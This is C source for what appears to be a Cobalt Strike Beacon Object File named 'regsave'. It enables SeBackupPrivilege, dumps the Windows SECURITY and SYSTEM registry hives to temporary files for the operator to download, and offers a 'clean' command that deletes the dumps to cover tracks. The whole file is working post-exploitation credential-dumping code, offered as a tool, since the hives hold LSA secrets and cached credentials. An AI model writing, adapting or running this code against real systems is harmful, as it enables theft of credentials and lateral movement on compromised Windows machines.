#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT LONG   WINAPI ADVAPI32$RegOpenKeyExW        (HKEY hKey, LPCWSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);
DECLSPEC_IMPORT LONG   WINAPI ADVAPI32$RegSaveKeyW          (HKEY hKey, LPCWSTR lpFile, LPSECURITY_ATTRIBUTES lpSA);
DECLSPEC_IMPORT LONG   WINAPI ADVAPI32$RegCloseKey          (HKEY hKey);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$OpenProcessToken     (HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$LookupPrivilegeValueW(LPCWSTR lpSystemName, LPCWSTR lpName, PLUID lpLuid);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$AdjustTokenPrivileges(HANDLE TokenHandle, BOOL DisableAll, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD RetLen);

DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetCurrentProcess    (void);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle          (HANDLE hObject);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$DeleteFileW          (LPCWSTR lpFileName);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetLastError         (void);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetTickCount         (void);

DECLSPEC_IMPORT int __cdecl MSVCRT$wcscmp(const wchar_t *, const wchar_t *);

static wchar_t security_hive_path[MAX_PATH];
static wchar_t system_hive_path[MAX_PATH];


static void _build_path(wchar_t * output, size_t capacity, DWORD suffix)
{
    static const wchar_t base[]      = L"C:\\Windows\\Temp\\rs_";
    static const wchar_t extension[] = L".tmp";
    static const wchar_t hex_chars[] = L"0123456789abcdef";
    size_t position = 0;

    for (size_t i = 0; base[i] && position < capacity - 1; i++) {
        output[position++] = base[i];
    }

    for (size_t i = 0; i < 8 && position < capacity - 1; i++) {
        output[position++] = hex_chars[(suffix >> (28 - i * 4)) & 0xf];
    }

    for (size_t i = 0; extension[i] && position < capacity - 1; i++) {
        output[position++] = extension[i];
    }

    output[position] = L'\0';
}


static BOOL _enable_backup_privilege(void)
{
    HANDLE           process_token;
    TOKEN_PRIVILEGES token_privileges;

    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &process_token)) {
        return FALSE;
    }

    if (!ADVAPI32$LookupPrivilegeValueW(NULL, L"SeBackupPrivilege", &token_privileges.Privileges[0].Luid)) {
        KERNEL32$CloseHandle(process_token);
        return FALSE;
    }

    token_privileges.PrivilegeCount           = 1;
    token_privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    ADVAPI32$AdjustTokenPrivileges(process_token, FALSE, &token_privileges, sizeof(token_privileges), NULL, NULL);
    KERNEL32$CloseHandle(process_token);
    return (KERNEL32$GetLastError() == ERROR_SUCCESS);
}


static void _do_dump(void)
{
    HKEY registry_key;
    LONG result_code;
    DWORD tick_count = KERNEL32$GetTickCount();

    _build_path(security_hive_path, MAX_PATH, tick_count);
    _build_path(system_hive_path,   MAX_PATH, tick_count ^ 0xA5A5A5A5);

    if (!_enable_backup_privilege()) {
        BeaconPrintf(CALLBACK_ERROR, "[!] SeBackupPrivilege enable failed (0x%lx) -- need SYSTEM", (unsigned long)KERNEL32$GetLastError());
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] SeBackupPrivilege enabled");

    KERNEL32$DeleteFileW(security_hive_path);
    KERNEL32$DeleteFileW(system_hive_path);

    result_code = ADVAPI32$RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SECURITY", 0, KEY_READ, &registry_key);
    if (result_code != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[!] RegOpenKeyEx(SECURITY) failed: 0x%lx", (unsigned long)result_code);
        return;
    }

    result_code = ADVAPI32$RegSaveKeyW(registry_key, security_hive_path, NULL);
    ADVAPI32$RegCloseKey(registry_key);
    if (result_code != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[!] RegSaveKey(SECURITY) failed: 0x%lx", (unsigned long)result_code);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] SECURITY -> %ls", security_hive_path);

    result_code = ADVAPI32$RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM", 0, KEY_READ, &registry_key);
    if (result_code != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[!] RegOpenKeyEx(SYSTEM) failed: 0x%lx", (unsigned long)result_code);
        KERNEL32$DeleteFileW(security_hive_path);
        return;
    }

    result_code = ADVAPI32$RegSaveKeyW(registry_key, system_hive_path, NULL);
    ADVAPI32$RegCloseKey(registry_key);
    if (result_code != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[!] RegSaveKey(SYSTEM) failed: 0x%lx", (unsigned long)result_code);
        KERNEL32$DeleteFileW(security_hive_path);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] SYSTEM   -> %ls", system_hive_path);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] download both, then: regsave clean %ls %ls", security_hive_path, system_hive_path);
}


static void _do_clean(PWSTR path1, PWSTR path2)
{
    int deleted_count = 0;

    if (path1 && path1[0]) {
        if (KERNEL32$DeleteFileW(path1)) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] deleted %ls", path1);
            deleted_count++;
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[!] delete %ls failed: 0x%lx", path1, (unsigned long)KERNEL32$GetLastError());
        }
    }

    if (path2 && path2[0]) {
        if (KERNEL32$DeleteFileW(path2)) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] deleted %ls", path2);
            deleted_count++;
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[!] delete %ls failed: 0x%lx", path2, (unsigned long)KERNEL32$GetLastError());
        }
    }

    if (deleted_count == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] no paths provided -- usage: regsave clean <sec_path> <sys_path>");
    }
}


void go(IN char * args, IN int alen)
{
    datap parser;
    PWSTR action = NULL;
    PWSTR path1  = NULL;
    PWSTR path2  = NULL;

    if (alen > 0) {
        BeaconDataParse(&parser, args, alen);
        action = (PWSTR) BeaconDataExtract(&parser, NULL);
        path1  = (PWSTR) BeaconDataExtract(&parser, NULL);
        path2  = (PWSTR) BeaconDataExtract(&parser, NULL);
    }

    if (action && MSVCRT$wcscmp(action, L"clean") == 0) {
        _do_clean(path1, path2);
    } else {
        _do_dump();
    }
}
